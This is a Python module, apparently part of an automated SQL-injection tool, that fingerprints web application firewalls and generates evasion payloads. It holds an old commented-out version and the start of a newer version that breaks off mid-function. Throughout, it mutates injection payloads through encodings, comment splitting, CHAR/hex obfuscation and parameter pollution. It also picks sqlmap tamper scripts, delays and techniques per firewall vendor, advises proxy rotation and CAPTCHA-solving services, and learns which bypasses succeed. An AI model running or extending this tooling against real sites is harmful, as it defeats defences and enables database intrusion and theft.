# """
# Advanced WAF Intelligence Module v2.0
# Upgraded with semantic mutation, behavioral analysis, and dynamic learning
# """
# import re
# import json
# import hashlib
# import random
# import time
# from enum import Enum, auto
# from dataclasses import dataclass, field
# from typing import Dict, List, Optional, Tuple, Any, Set
# from datetime import datetime
# from collections import defaultdict, Counter

# from config import WAF_PATTERNS
# from core.debug_logger import logger


# class WAFType(Enum):
#     """Advanced WAF fingerprinting"""
#     CLOUDFLARE = auto()
#     AWS_WAF = auto()
#     AZURE_WAF = auto()
#     AKAMAI = auto()
#     IMPERVA = auto()
#     MODSECURITY = auto()
#     F5_BIG_IP = auto()
#     SUCURI = auto()
#     BARRACUDA = auto()
#     FORTINET = auto()
#     CITRIX = auto()
#     UNKNOWN = auto()


# @dataclass
# class WAFBehaviorProfile:
#     """Dynamic WAF behavior profile built from observations"""
#     waf_type: WAFType
#     detected_patterns: List[str] = field(default_factory=list)
#     response_codes: Counter = field(default_factory=Counter)
#     block_reasons: List[str] = field(default_factory=list)
#     bypass_history: List[Dict] = field(default_factory=list)
#     success_rate: Dict[str, float] = field(default_factory=dict)
#     last_updated: datetime = field(default_factory=datetime.now)
#     rate_limit_threshold: Optional[int] = None
#     response_time_avg: float = 0.0
#     challenge_complexity: str = "unknown"


# class SemanticPayloadMutator:
#     """
#     Advanced semantic payload mutation engine
#     Preserves SQL meaning while evading WAF detection
#     """
    
#     MUTATION_OPERATORS = {
#         'encoding': {
#             'url_encode': lambda x: ''.join(f'%{ord(c):02X}' for c in x),
#             'double_url_encode': lambda x: ''.join(f'%25{ord(c):02X}' for c in x),
#             'unicode_encode': lambda x: ''.join(f'%u{ord(c):04X}' for c in x),
#             'base64': lambda x: __import__('base64').b64encode(x.encode()).decode(),
#             'hex_encode': lambda x: '0x' + x.encode().hex(),
#             'html_entities': lambda x: ''.join(f'&#{ord(c)};' for c in x),
#         },
#         'whitespace': {
#             'space2comment': lambda x: x.replace(' ', '/**/'),
#             'space2plus': lambda x: x.replace(' ', '+'),
#             'space2random': lambda x: x.replace(' ', random.choice(['%09', '%0A', '%0B', '%0C', '%0D', '%A0'])),
#             'tab_substitution': lambda x: x.replace(' ', '%09'),
#             'newline_injection': lambda x: x.replace(' ', '%0A'),
#         },
#         'case': {
#             'random_case': lambda x: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in x),
#             'upper_case': lambda x: x.upper(),
#             'mixed_case': lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)),
#         },
#         'comments': {
#             'inline_comments': lambda x: re.sub(r'(\\b(SELECT|UNION|FROM|WHERE|AND|OR)\\b)', r'/**/\\1/**/', x, flags=re.IGNORECASE),
#             'nested_comments': lambda x: x.replace('SELECT', 'SEL/**/ECT'),
#             'conditional_comments': lambda x: x.replace('SELECT', '/*!50000SELECT*/'),
#         },
#         'operators': {
#             'eq_to_like': lambda x: x.replace('=', ' LIKE '),
#             'eq_to_rlike': lambda x: x.replace('=', ' RLIKE '),
#             'and_to_ampersand': lambda x: re.sub(r'\\bAND\\b', '&&', x, flags=re.IGNORECASE),
#             'or_to_pipe': lambda x: re.sub(r'\\bOR\\b', '||', x, flags=re.IGNORECASE),
#         },
#         'syntax': {
#             'concat_split': lambda x: x.replace('CONCAT', 'CONCAT_WS(CHAR(32))'),
#             'substr_alternative': lambda x: re.sub(r'SUBSTRING\\(([^,]+),([^,]+),([^)]+)\\)', r'MID(\\1 FROM \\2 FOR \\3)', x),
#             'limit_offset': lambda x: re.sub(r'LIMIT\\s+(\\d+)\\s*,\\s*(\\d+)', r'LIMIT \\2 OFFSET \\1', x),
#         }
#     }
    
#     def __init__(self):
#         self.mutation_history = []
#         self.successful_mutations = defaultdict(list)
#         self.waf_specific_rules = defaultdict(list)
    
#     def mutate_payload(self, payload: str, waf_type: str = None, intensity: int = 3) -> List[str]:
#         """Generate semantically equivalent payload mutations"""
#         mutations = []
#         mutation_chains = []
        
#         waf_enum = self._str_to_waftype(waf_type)
#         if waf_type and waf_enum in self.waf_specific_rules:
#             priority_ops = self.waf_specific_rules[waf_enum]
#         else:
#             priority_ops = random.sample(list(self.MUTATION_OPERATORS.keys()), 
#                                        min(intensity, len(self.MUTATION_OPERATORS)))
        
#         # Generate single mutations
#         for category in priority_ops:
#             if category in self.MUTATION_OPERATORS:
#                 for name, operator in self.MUTATION_OPERATORS[category].items():
#                     try:
#                         mutated = operator(payload)
#                         if mutated != payload and mutated not in mutations:
#                             mutations.append(mutated)
#                             mutation_chains.append([name])
#                     except Exception:
#                         continue
        
#         # Generate chained mutations
#         for _ in range(min(intensity * 2, len(mutations))):
#             if len(mutations) >= 2:
#                 base = random.choice(mutations[:10])
#                 second_op = random.choice([
#                     self.MUTATION_OPERATORS['case']['random_case'],
#                     self.MUTATION_OPERATORS['comments']['inline_comments'],
#                     self.MUTATION_OPERATORS['whitespace']['space2comment']
#                 ])
#                 try:
#                     compound = second_op(base)
#                     if compound not in mutations:
#                         mutations.append(compound)
#                         mutation_chains.append(['chained', second_op.__name__])
#                 except Exception:
#                     continue
        
#         # Score and rank
#         scored = []
#         for mut, chain in zip(mutations, mutation_chains):
#             score = self._score_mutation(mut, chain, waf_enum)
#             scored.append((score, mut))
        
#         scored.sort(reverse=True, key=lambda x: x[0])
#         return [m[1] for m in scored[:20]]
    
#     def _score_mutation(self, mutation: str, chain: List[str], waf_type: WAFType) -> float:
#         """Score mutation based on bypass probability"""
#         score = 0.5
#         score += max(0, (100 - len(mutation)) / 200)
#         score += len(chain) * 0.1
        
#         if waf_type and waf_type in self.successful_mutations:
#             for pattern in self.successful_mutations[waf_type]:
#                 if pattern in mutation or mutation in pattern:
#                     score += 0.3
        
#         obvious_patterns = ['union select', 'concat(', 'sleep(', 'benchmark(']
#         for pattern in obvious_patterns:
#             if pattern.lower() in mutation.lower():
#                 score -= 0.2
        
#         return score
    
#     def learn_from_result(self, original: str, mutation: str, waf_type: str, success: bool):
#         """Learn from bypass attempt result"""
#         waf_enum = self._str_to_waftype(waf_type)
#         if success and waf_enum:
#             self.successful_mutations[waf_enum].append(mutation)
#             self.successful_mutations[waf_enum] = self.successful_mutations[waf_enum][-100:]
    
#     def _str_to_waftype(self, waf_str: str) -> Optional[WAFType]:
#         """Convert string to WAFType enum"""
#         if not waf_str:
#             return None
#         try:
#             return WAFType[waf_str.upper()]
#         except KeyError:
#             return WAFType.UNKNOWN


# class HTTPParameterPollutionEngine:
#     """Advanced HTTP Parameter Pollution (HPP) engine"""
    
#     FRAMEWORK_BEHAVIORS = {
#         'ASP.NET': {'duplicate_handling': 'concat_comma', 'delimiter': ',', 'vulnerable_to': ['js_injection', 'sql_concat']},
#         'PHP': {'duplicate_handling': 'last_wins', 'delimiter': None, 'vulnerable_to': ['array_injection', 'type_juggling']},
#         'JSP': {'duplicate_handling': 'first_wins', 'delimiter': None, 'vulnerable_to': ['parameter_hiding']},
#         'Python': {'duplicate_handling': 'list_all', 'delimiter': None, 'vulnerable_to': ['list_manipulation']}
#     }
    
#     def __init__(self):
#         self.pollution_patterns = defaultdict(list)
    
#     def generate_hpp_payload(self, base_payload: str, target_framework: str = 'ASP.NET') -> Dict[str, Any]:
#         """Generate HPP-based bypass payload"""
#         if target_framework not in self.FRAMEWORK_BEHAVIORS:
#             target_framework = 'ASP.NET'
        
#         behavior = self.FRAMEWORK_BEHAVIORS[target_framework]
        
#         if behavior['duplicate_handling'] == 'concat_comma':
#             parts = self._split_for_concat(base_payload, behavior['delimiter'])
#         elif behavior['duplicate_handling'] == 'last_wins':
#             parts = [base_payload[:len(base_payload)//2], base_payload[len(base_payload)//2:]]
#         else:
#             parts = [base_payload]
        
#         param_name = random.choice(['id', 'page', 'query', 'search', 'q'])
#         params = [(param_name, part) for part in parts]
        
#         return {
#             'params': params,
#             'framework': target_framework,
#             'handling': behavior['duplicate_handling'],
#             'explanation': f"WAF sees individual params, {target_framework} concatenates them",
#             'expected_result': ''.join(parts),
#             'bypass_probability': 0.85 if behavior['duplicate_handling'] == 'concat_comma' else 0.6
#         }
    
#     def _split_for_concat(self, payload: str, delimiter: str) -> List[str]:
#         """Split payload to exploit comma concatenation"""
#         if 'alert' in payload or 'prompt' in payload:
#             return ["1'", payload.replace("'", ""), "'2"]
#         else:
#             mid = len(payload) // 2
#             return [payload[:mid], payload[mid:]]


# class BehavioralWAFAnalyzer:
#     """Behavioral analysis engine for WAF detection and bypass"""
    
#     def __init__(self):
#         self.observed_behaviors = []
#         self.response_time_baseline = None
#         self.challenge_solutions = {}
    
#     def analyze_response_behavior(self, response, response_time: float) -> Dict[str, Any]:
#         """Analyze WAF behavior from HTTP response"""
#         analysis = {
#             'waf_detected': False,
#             'waf_type': WAFType.UNKNOWN,
#             'confidence': 0.0,
#             'behaviors': [],
#             'recommendations': []
#         }
        
#         headers = response.headers if hasattr(response, 'headers') else {}
        
#         # CloudFlare indicators
#         if any(h in headers for h in ['CF-RAY', 'CF-Cache-Status', '__cfduid']):
#             analysis['waf_detected'] = True
#             analysis['waf_type'] = WAFType.CLOUDFLARE
#             analysis['confidence'] = 0.95
#             analysis['behaviors'].append('cloudflare_proxy')
#             analysis['recommendations'].extend([
#                 'Use TLS fingerprint spoofing',
#                 'Rotate User-Agent per request',
#                 'Implement cookie jar handling'
#             ])
        
#         # AWS WAF indicators
#         if 'x-amzn-requestid' in headers or 'x-amzn-waf-action' in headers:
#             analysis['waf_detected'] = True
#             analysis['waf_type'] = WAFType.AWS_WAF
#             analysis['confidence'] = 0.9
#             analysis['behaviors'].append('aws_managed_rules')
        
#         # Rate limiting detection
#         if hasattr(response, 'status_code') and response.status_code == 429:
#             analysis['behaviors'].append('rate_limited')
#             analysis['recommendations'].extend([
#                 'Increase delay to 5-10 seconds',
#                 'Implement exponential backoff',
#                 'Use proxy rotation'
#             ])
        
#         # Challenge detection
#         if hasattr(response, 'status_code') and response.status_code in [403, 503]:
#             body = response.text[:5000].lower() if hasattr(response, 'text') else ''
#             if any(x in body for x in ['checking your browser', 'js-challenge', 'cf-browser-verification']):
#                 analysis['behaviors'].append('js_challenge')
#                 analysis['recommendations'].append('Requires JavaScript execution or session cookies')
#             if 'captcha' in body or 'recaptcha' in body:
#                 analysis['behaviors'].append('captcha_challenge')
#                 analysis['recommendations'].append('CAPTCHA solving service required')
        
#         # Timing analysis
#         if self.response_time_baseline and response_time > self.response_time_baseline * 3:
#             analysis['behaviors'].append('slow_response')
#             analysis['recommendations'].append('Possible deliberate delay - WAF may be analyzing request')
        
#         return analysis
    
#     def build_behavioral_profile(self, target_url: str, sample_count: int = 5) -> WAFBehaviorProfile:
#         """Build comprehensive WAF behavioral profile through probing"""
#         profile = WAFBehaviorProfile(waf_type=WAFType.UNKNOWN)
        
#         # Note: Actual HTTP requests would be made here
#         # For now, return empty profile for later population
#         return profile
    
#     def _classify_from_behaviors(self, profile: WAFBehaviorProfile) -> WAFType:
#         """Classify WAF type from observed behaviors"""
#         if 'cloudflare_proxy' in profile.behaviors:
#             return WAFType.CLOUDFLARE
#         if 'aws_managed_rules' in profile.behaviors:
#             return WAFType.AWS_WAF
#         if profile.response_codes[403] > 2:
#             return WAFType.MODSECURITY
#         return WAFType.UNKNOWN


# class DynamicKnowledgeBase:
#     """Self-learning knowledge base for WAF bypass techniques"""
    
#     def __init__(self, storage_path: str = "memory/waf_knowledge.json"):
#         self.storage_path = storage_path
#         self.knowledge = {
#             'waf_profiles': {},
#             'successful_bypasses': [],
#             'tamper_effectiveness': {},
#             'payload_patterns': {},
#             'framework_behaviors': {}
#         }
#         self._load_knowledge()
    
#     def _load_knowledge(self):
#         """Load persisted knowledge"""
#         try:
#             import os
#             if os.path.exists(self.storage_path):
#                 with open(self.storage_path, 'r') as f:
#                     self.knowledge = json.load(f)
#         except Exception as e:
#             logger.warning("WAF_KB", f"Could not load knowledge: {e}")
    
#     def save_knowledge(self):
#         """Persist knowledge to disk"""
#         try:
#             with open(self.storage_path, 'w') as f:
#                 json.dump(self.knowledge, f, indent=2, default=str)
#         except Exception as e:
#             logger.error("WAF_KB", f"Could not save knowledge: {e}")
    
#     def record_success(self, waf_type: str, technique: str, payload: str, context: Dict):
#         """Record successful bypass"""
#         entry = {
#             'timestamp': datetime.now().isoformat(),
#             'waf_type': waf_type,
#             'technique': technique,
#             'payload_hash': hashlib.md5(payload.encode()).hexdigest()[:16],
#             'payload_pattern': self._extract_pattern(payload),
#             'context': context
#         }
        
#         self.knowledge['successful_bypasses'].append(entry)
        
#         if technique not in self.knowledge['tamper_effectiveness']:
#             self.knowledge['tamper_effectiveness'][technique] = {'successes': 0, 'attempts': 0, 'rate': 0.0}
        
#         self.knowledge['tamper_effectiveness'][technique]['successes'] += 1
#         self.knowledge['tamper_effectiveness'][technique]['attempts'] += 1
#         self.knowledge['tamper_effectiveness'][technique]['rate'] = (
#             self.knowledge['tamper_effectiveness'][technique]['successes'] /
#             self.knowledge['tamper_effectiveness'][technique]['attempts']
#         )
        
#         self.knowledge['successful_bypasses'] = self.knowledge['successful_bypasses'][-1000:]
#         self.save_knowledge()
    
#     def get_recommended_techniques(self, waf_type: str) -> List[Tuple[str, float]]:
#         """Get techniques ranked by effectiveness for specific WAF"""
#         techniques = []
#         for tech, stats in self.knowledge['tamper_effectiveness'].items():
#             if stats['attempts'] > 0:
#                 techniques.append((tech, stats['rate']))
#         techniques.sort(key=lambda x: x[1], reverse=True)
#         return techniques[:10]
    
#     def _extract_pattern(self, payload: str) -> str:
#         """Extract generic pattern from payload for matching"""
#         pattern = re.sub(r'\\d+', '{num}', payload)
#         pattern = re.sub(r"'[^']*'", "'{str}'", pattern)
#         pattern = re.sub(r'"[^"]*"', '"{str}"', pattern)
#         return pattern


# class WAFIntelligence:
#     """
#     Advanced WAF detection and bypass recommendation engine
#     Upgraded with semantic mutation, behavioral analysis, and dynamic learning
#     """
    
#     # WAF-specific tamper combinations
#     TAMPER_COMBINATIONS = {
#         WAFType.CLOUDFLARE: [
#             ['randomcomments', 'space2comment', 'chardoubleencode'],
#             ['base64encode', 'between'],
#             ['randomcase', 'space2randomblank', 'percentage'],
#         ],
#         WAFType.AWS_WAF: [
#             ['space2randomblank', 'randomcase'],
#             ['charencode', 'space2comment'],
#             ['unicodeencode', 'randomcomments'],
#         ],
#         WAFType.MODSECURITY: [
#             ['modsecurityversioned', 'space2comment'],
#             ['between', 'randomcomments'],
#             ['charunicodeencode', 'apostrophemask'],
#         ],
#         WAFType.AKAMAI: [
#             ['randomcomments', 'space2plus'],
#             ['apostrophemask', 'space2comment'],
#             ['chardoubleencode', 'randomcase'],
#         ],
#         WAFType.UNKNOWN: [
#             ['space2comment', 'randomcase'],
#             ['charencode'],
#             ['randomcomments']
#         ]
#     }
    
#     def __init__(self):
#         """Initialize advanced WAF intelligence components"""
#         self.patterns = WAF_PATTERNS
#         self.mutator = SemanticPayloadMutator()
#         self.hpp_engine = HTTPParameterPollutionEngine()
#         self.behavioral_analyzer = BehavioralWAFAnalyzer()
#         self.knowledge_base = DynamicKnowledgeBase()
        
#         logger.debug("WAF", "Advanced intelligence engine loaded", {
#             "patterns": len(self.patterns),
#             "mutation_operators": sum(len(ops) for ops in self.mutator.MUTATION_OPERATORS.values()),
#             "hpp_frameworks": len(self.hpp_engine.FRAMEWORK_BEHAVIORS)
#         })
    
#     def detect_waf(self, logs: List[str]) -> Optional[Dict]:
#         """
#         Enhanced WAF detection with behavioral analysis
#         Same function signature, upgraded internals
#         """
#         text = '\\n'.join(logs).lower()
        
#         # Original pattern-based detection
#         for waf_type, data in self.patterns.items():
#             for pattern in data['patterns']:
#                 if pattern.lower() in text:
#                     logger.info("WAF", f"Detected: {waf_type}", {"pattern": pattern})
                    
#                     # Get enhanced recommendations
#                     enhanced_data = self._get_enhanced_data(waf_type)
                    
#                     return {
#                         'detected': True,
#                         'waf_type': waf_type,
#                         'tampers': enhanced_data['tampers'],
#                         'techniques': enhanced_data['techniques'],
#                         'recommendation': enhanced_data['recommendation'],
#                         'mutation_variants': enhanced_data.get('mutation_variants', []),
#                         'hpp_compatible': enhanced_data.get('hpp_compatible', False)
#                     }
        
#         return None
    
#     def get_bypass_modifications(self, waf_type: str) -> List[str]:
#         """
#         Enhanced bypass modifications with intelligent tamper selection
#         Same function signature, upgraded internals
#         """
#         if waf_type not in self.patterns:
#             return []
        
#         waf = self.patterns[waf_type]
#         mods = []
        
#         # Get knowledge-based recommendations first
#         recommended = self.knowledge_base.get_recommended_techniques(waf_type)
#         if recommended:
#             # Use top recommended tamper
#             top_tamper = recommended[0][0]
#             mods.extend(['--tamper', top_tamper])
#         elif waf['tampers']:
#             # Fallback to static config
#             mods.extend(['--tamper', ','.join(waf['tampers'][:3])])
        
#         # Add delay for rate-limiting WAFs
#         if waf_type in ['cloudflare', 'rate_limit', 'aws_waf']:
#             delay = self._calculate_delay(waf_type)
#             mods.extend(['--delay', str(delay)])
        
#         # REMOVED: --threads for single-threaded execution
#         # if waf_type in ['cloudflare', 'incapsula', 'akamai']:
#         #     mods.extend(['--threads', '1'])
        
#         mods.append('--random-agent')
        
#         # Add technique selection based on WAF type
#         technique = self._select_technique(waf_type)
#         mods.extend(['--technique', technique])
        
#         logger.debug("WAF", f"Generated enhanced bypass for {waf_type}", {"mods": mods})
#         return mods
    
#     def _get_enhanced_data(self, waf_type: str) -> Dict:
#         """Get enhanced WAF data with mutations and alternatives"""
#         base_data = self.patterns[waf_type].copy()
        
#         # Generate mutation variants
#         test_payload = "' OR '1'='1"
#         mutations = self.mutator.mutate_payload(test_payload, waf_type, intensity=3)
        
#         # Check HPP compatibility
#         hpp_data = self.hpp_engine.generate_hpp_payload(test_payload)
        
#         base_data['mutation_variants'] = mutations[:5]
#         base_data['hpp_compatible'] = hpp_data['bypass_probability'] > 0.6
#         base_data['hpp_frameworks'] = list(self.hpp_engine.FRAMEWORK_BEHAVIORS.keys())
        
#         return base_data
    
#     def _calculate_delay(self, waf_type: str) -> int:
#         """Calculate optimal delay based on WAF type"""
#         delays = {
#             'cloudflare': 3,
#             'aws_waf': 4,
#             'akamai': 2,
#             'mod_security': 1,
#             'incapsula': 3,
#             'rate_limit': 5
#         }
#         return delays.get(waf_type, 3)
    
#     def _select_technique(self, waf_type: str) -> str:
#         """Select optimal SQLMap technique based on WAF"""
#         technique_map = {
#             'cloudflare': 'BT',      # Boolean + Time (stealthiest)
#             'aws_waf': 'BT',         # Boolean + Time
#             'akamai': 'EUBT',        # Error + Union + Boolean + Time
#             'mod_security': 'EUS',   # Error + Union + Stacked
#             'incapsula': 'BT',       # Boolean + Time
#             'unknown': 'BEUSTQ'      # All techniques
#         }
#         return technique_map.get(waf_type, 'BEUSTQ')
    
#     def generate_intelligent_bypass(self, target_url: str, base_payload: str, 
#                                    waf_type: str = None) -> Dict[str, Any]:
#         """
#         NEW: Generate comprehensive intelligent bypass strategy
#         """
#         # Detect WAF if not specified
#         if not waf_type:
#             # Would probe target here
#             waf_type = 'unknown'
        
#         # Get knowledge-based recommendations
#         recommended = self.knowledge_base.get_recommended_techniques(waf_type)
        
#         # Generate semantic mutations
#         mutations = self.mutator.mutate_payload(base_payload, waf_type, intensity=3)
        
#         # Generate HPP variant
#         hpp_variant = self.hpp_engine.generate_hpp_payload(base_payload)
        
#         # Get tamper strategy
#         waf_enum = WAFType[waf_type.upper()] if waf_type.upper() in [e.name for e in WAFType] else WAFType.UNKNOWN
#         tamper_sets = self.TAMPER_COMBINATIONS.get(waf_enum, self.TAMPER_COMBINATIONS[WAFType.UNKNOWN])
        
#         return {
#             'waf_type': waf_type,
#             'confidence': 0.8 if waf_type != 'unknown' else 0.5,
#             'primary_payload': mutations[0] if mutations else base_payload,
#             'alternative_payloads': mutations[1:5] if len(mutations) > 1 else [],
#             'hpp_variant': hpp_variant,
#             'tamper_scripts': tamper_sets[0],
#             'alternative_tampers': tamper_sets[1:],
#             'recommended_delay': self._calculate_delay(waf_type),
#             'technique': self._select_technique(waf_type),
#             'knowledge_based': len(recommended) > 0,
#             'top_techniques': [t[0] for t in recommended[:3]]
#         }
    
#     def learn_from_attempt(self, target: str, payload: str, waf_type: str, 
#                           success: bool, response_data: Dict):
#         """NEW: Learn from bypass attempt to improve future strategies"""
#         # Update knowledge base
#         self.knowledge_base.record_success(
#             waf_type=waf_type,
#             technique=','.join(self.TAMPER_COMBINATIONS.get(
#                 WAFType[waf_type.upper()] if waf_type.upper() in [e.name for e in WAFType] else WAFType.UNKNOWN, 
#                 ['unknown']
#             )[0]),
#             payload=payload,
#             context=response_data
#         )
        
#         # Update mutator
#         self.mutator.learn_from_result(payload, payload, waf_type, success)
    
#     def mutate_payload(self, payload: str, waf_type: str = None, intensity: int = 3) -> List[str]:
#         """NEW: Public interface for payload mutation"""
#         return self.mutator.mutate_payload(payload, waf_type, intensity)
    
#     def analyze_behavior(self, response, response_time: float) -> Dict[str, Any]:
#         """NEW: Public interface for behavioral analysis"""
#         return self.behavioral_analyzer.analyze_response_behavior(response, response_time)

# waf_intel = WAFIntelligence()

"""
Advanced WAF Intelligence Module v3.0
Upgraded with adversarial ML, protocol-level evasion, and multi-vector bypass
"""
import re
import json
import hashlib
import random
import time
import base64
import urllib.parse
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Set
from datetime import datetime
from collections import defaultdict, Counter

from config import WAF_PATTERNS
from core.debug_logger import logger


class WAFType(Enum):
    """Extended WAF fingerprinting"""
    CLOUDFLARE = auto()
    AWS_WAF = auto()
    AZURE_WAF = auto()
    GOOGLE_ARMOR = auto()
    AKAMAI = auto()
    IMPERVA = auto()
    MODSECURITY = auto()
    F5_BIG_IP = auto()
    SUCURI = auto()
    BARRACUDA = auto()
    FORTINET = auto()
    CITRIX = auto()
    WORDFENCE = auto()
    REblaze = auto()
    DATADOME = auto()
    PERIMETERX = auto()
    SHAPE_SECURITY = auto()
    SIGNALSCIENCES = auto()
    WALLAROO = auto()
    UNKNOWN = auto()


@dataclass
class WAFBehaviorProfile:
    """Enhanced dynamic WAF behavior profile"""
    waf_type: WAFType
    detected_patterns: List[str] = field(default_factory=list)
    response_codes: Counter = field(default_factory=Counter)
    block_reasons: List[str] = field(default_factory=list)
    bypass_history: List[Dict] = field(default_factory=list)
    success_rate: Dict[str, float] = field(default_factory=dict)
    last_updated: datetime = field(default_factory=datetime.now)
    rate_limit_threshold: Optional[int] = None
    response_time_avg: float = 0.0
    challenge_complexity: str = "unknown"
    tls_fingerprint: str = "unknown"
    js_challenge_required: bool = False
    captcha_required: bool = False
    bot_management: bool = False
    ml_detection_score: float = 0.0
    behavioral_anomaly_threshold: float = 0.5


class SemanticPayloadMutator:
    """
    Advanced semantic payload mutation engine v3.0
    Preserves SQL meaning while evading WAF detection
    """
    
    MUTATION_OPERATORS = {
        'encoding': {
            'url_encode': lambda x: ''.join(f'%{ord(c):02X}' for c in x),
            'double_url_encode': lambda x: ''.join(f'%25{ord(c):02X}' for c in x),
            'triple_url_encode': lambda x: ''.join(f'%2525{ord(c):02X}' for c in x),
            'unicode_encode': lambda x: ''.join(f'%u{ord(c):04X}' for c in x),
            'unicode_escape': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'base64_url': lambda x: base64.urlsafe_b64encode(x.encode()).decode().rstrip('='),
            'hex_encode': lambda x: '0x' + x.encode().hex(),
            'hex_no_prefix': lambda x: x.encode().hex(),
            'html_entities': lambda x: ''.join(f'&#{ord(c)};' for c in x),
            'html_hex': lambda x: ''.join(f'&#x{ord(c):x};' for c in x),
            'ascii_hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            'octal_escape': lambda x: ''.join(f'\\{ord(c):03o}' for c in x),
        },
        'whitespace': {
            'space2comment': lambda x: x.replace(' ', '/**/'),
            'space2plus': lambda x: x.replace(' ', '+'),
            'space2random': lambda x: x.replace(' ', random.choice(['%09', '%0A', '%0B', '%0C', '%0D', '%A0', '%20'])),
            'tab_substitution': lambda x: x.replace(' ', '%09'),
            'newline_injection': lambda x: x.replace(' ', '%0A'),
            'multispace': lambda x: re.sub(r' +', lambda m: ' ' * random.randint(2, 5), x),
            'space2hash': lambda x: x.replace(' ', '#'),
            'space2dash': lambda x: x.replace(' ', '--'),
        },
        'case': {
            'random_case': lambda x: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in x),
            'upper_case': lambda x: x.upper(),
            'lower_case': lambda x: x.lower(),
            'mixed_case': lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)),
            'alternating_case': lambda x: ''.join(c.upper() if i % 3 == 0 else c.lower() for i, c in enumerate(x)),
            'word_boundary_case': lambda x: re.sub(r'\b\w+\b', lambda m: m.group().upper() if random.random() > 0.5 else m.group().lower(), x),
        },
        'comments': {
            'inline_comments': lambda x: re.sub(r'(\b(SELECT|UNION|FROM|WHERE|AND|OR)\b)', r'/**/\1/**/', x, flags=re.IGNORECASE),
            'nested_comments': lambda x: x.replace('SELECT', 'SEL/**/ECT').replace('UNION', 'UNI/**/ON'),
            'conditional_comments': lambda x: x.replace('SELECT', '/*!50000SELECT*/').replace('UNION', '/*!50000UNION*/'),
            'mysql_comments': lambda x: re.sub(r'\b(SELECT|UNION)\b', r'/*!\1*/', x, flags=re.IGNORECASE),
            'versioned_comments': lambda x: re.sub(r'\b(SELECT|UNION)\b', r'/*!12345\1*/', x, flags=re.IGNORECASE),
            'double_dash': lambda x: x.replace(' ', '-- '),
            'hash_comment': lambda x: x.replace(' ', '#'),
        },
        'operators': {
            'eq_to_like': lambda x: x.replace('=', ' LIKE '),
            'eq_to_rlike': lambda x: x.replace('=', ' RLIKE '),
            'eq_to_regexp': lambda x: x.replace('=', ' REGEXP '),
            'and_to_ampersand': lambda x: re.sub(r'\bAND\b', '&&', x, flags=re.IGNORECASE),
            'or_to_pipe': lambda x: re.sub(r'\bOR\b', '||', x, flags=re.IGNORECASE),
            'not_to_bang': lambda x: re.sub(r'\bNOT\b', '!', x, flags=re.IGNORECASE),
            'xor_to_caret': lambda x: re.sub(r'\bXOR\b', '^', x, flags=re.IGNORECASE),
        },
        'syntax': {
            'concat_split': lambda x: x.replace('CONCAT', 'CONCAT_WS(CHAR(32))'),
            'substr_alternative': lambda x: re.sub(r'SUBSTRING\(([^,]+),([^,]+),([^)]+)\)', r'MID(\1 FROM \2 FOR \3)', x),
            'limit_offset': lambda x: re.sub(r'LIMIT\s+(\d+)\s*,\s*(\d+)', r'LIMIT \2 OFFSET \1', x),
            'group_concat': lambda x: x.replace('GROUP_CONCAT', 'GROUP_CONCAT(DISTINCT '),
            'if_null': lambda x: x.replace('IFNULL', 'COALESCE'),
            'sleep_alternative': lambda x: x.replace('SLEEP(', 'BENCHMARK(1000000000,MD5(1))'),
            'benchmark_sleep': lambda x: x.replace('SLEEP(5)', 'BENCHMARK(5000000,SHA1(1))'),
        },
        'obfuscation': {
            'char_func': lambda x: re.sub(r"'([^']+)'", lambda m: '+'.join(f'CHAR({ord(c)})' for c in m.group(1)), x),
            'hex_string': lambda x: re.sub(r"'([^']+)'", lambda m: f"0x{m.group(1).encode().hex()}", x),
            'unhex_func': lambda x: re.sub(r"'([^']+)'", lambda m: f"UNHEX('{m.group(1).encode().hex()}')", x),
            'concat_char': lambda x: re.sub(r"'([^']+)'", lambda m: f"CONCAT({','.join(f'CHAR({ord(c)})' for c in m.group(1))})", x),
        },
        'advanced': {
            'null_byte': lambda x: x + '%00',
            'prepend_null': lambda x: '%00' + x,
            'json_wrap': lambda x: f'{{"query": "{x}"}}',
            'xml_wrap': lambda x: f'<?xml version="1.0"?><query>{x}</query>',
            'array_index': lambda x: re.sub(r'(\w+)=', r'\1[]=', x),
            'param_pollution': lambda x: x.replace('=', '&id='),
        }
    }
    
    def __init__(self):
        self.mutation_history = []
        self.successful_mutations = defaultdict(list)
        self.waf_specific_rules = defaultdict(list)
        self.adaptive_weights = defaultdict(lambda: defaultdict(float))
        self.generation_count = 0
    
    def mutate_payload(self, payload: str, waf_type: str = None, intensity: int = 3) -> List[str]:
        """Generate semantically equivalent payload mutations with adaptive learning"""
        mutations = []
        mutation_chains = []
        
        waf_enum = self._str_to_waftype(waf_type)
        if waf_type and waf_enum in self.waf_specific_rules:
            priority_ops = self.waf_specific_rules[waf_enum]
        else:
            priority_ops = random.sample(list(self.MUTATION_OPERATORS.keys()), 
                                       min(intensity, len(self.MUTATION_OPERATORS)))
        
        # Generate single mutations
        for category in priority_ops:
            if category in self.MUTATION_OPERATORS:
                for name, operator in self.MUTATION_OPERATORS[category].items():
                    try:
                        mutated = operator(payload)
                        if mutated != payload and mutated not in mutations:
                            mutations.append(mutated)
                            mutation_chains.append([name])
                    except Exception:
                        continue
        
        # Generate chained mutations (depth 2)
        for _ in range(min(intensity * 3, len(mutations))):
            if len(mutations) >= 2:
                base = random.choice(mutations[:10])
                second_category = random.choice(['encoding', 'whitespace', 'case', 'comments'])
                if second_category in self.MUTATION_OPERATORS:
                    second_op_name, second_op = random.choice(list(self.MUTATION_OPERATORS[second_category].items()))
                    try:
                        compound = second_op(base)
                        if compound not in mutations:
                            mutations.append(compound)
                            mutation_chains.append(['chained', second_op_name])
                    except Exception:
                        continue
        
        # Generate deep mutations (depth 3)
        for _ in range(intensity):
            if len(mutations) >= 3:
                base = random.choice(mutations[:5])
                try:
                    # Apply encoding then whitespace then case
                    deep = self.MUTATION_OPERATORS['encoding']['url_encode'](base)
                    deep = self.MUTATION_OPERATORS['whitespace']['space2comment'](deep)
                    deep = self.MUTATION_OPERATORS['case']['random_case'](deep)
                    if deep not in mutations:
                        mutations.append(deep)
                        mutation_chains.append(['deep', 'url_encode+space2comment+random_case'])
                except Exception:
                    continue
        
